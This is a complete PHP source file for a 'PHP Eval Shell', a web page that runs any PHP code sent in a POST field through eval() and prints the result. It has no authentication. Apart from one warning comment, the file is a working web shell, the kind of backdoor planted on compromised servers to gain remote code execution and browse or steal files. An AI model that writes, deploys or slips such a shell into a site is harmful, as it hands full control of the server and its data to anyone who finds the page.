<?php
$output = '';

if (!empty($_POST['cmd'])) {
    ob_start();
    try {
        // WARNING: this is insecure — DO NOT use in production
        eval('$output = ' . $_POST['cmd'] . ';');
    } catch (Throwable $e) {
        $output = 'Error: ' . $e->getMessage();
    }
    $output .= ob_get_clean();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>PHP Eval Shell</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        input, button, pre {
            font-family: monospace;
            padding: 10px;
            margin: 5px 0;
            width: 100%;
            box-sizing: border-box;
        }
        button { cursor: pointer; }
    </style>
</head>
<body>
    <h1>PHP Eval Shell</h1>
    <form method="post">
        <label for="cmd"><strong>PHP Code:</strong></label>
        <input type="text" name="cmd" id="cmd"
               value="<?= htmlspecialchars($_POST['cmd'] ?? '', ENT_QUOTES, 'UTF-8') ?>"
               placeholder="e.g., print_r(scandir('.'));" required>
        <button type="submit">Execute</button>
    </form>

    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
        <h2>Output</h2>
        <pre><?= htmlspecialchars($output ?? 'No result.', ENT_QUOTES, 'UTF-8') ?></pre>
    <?php endif; ?>
</body>
</html>
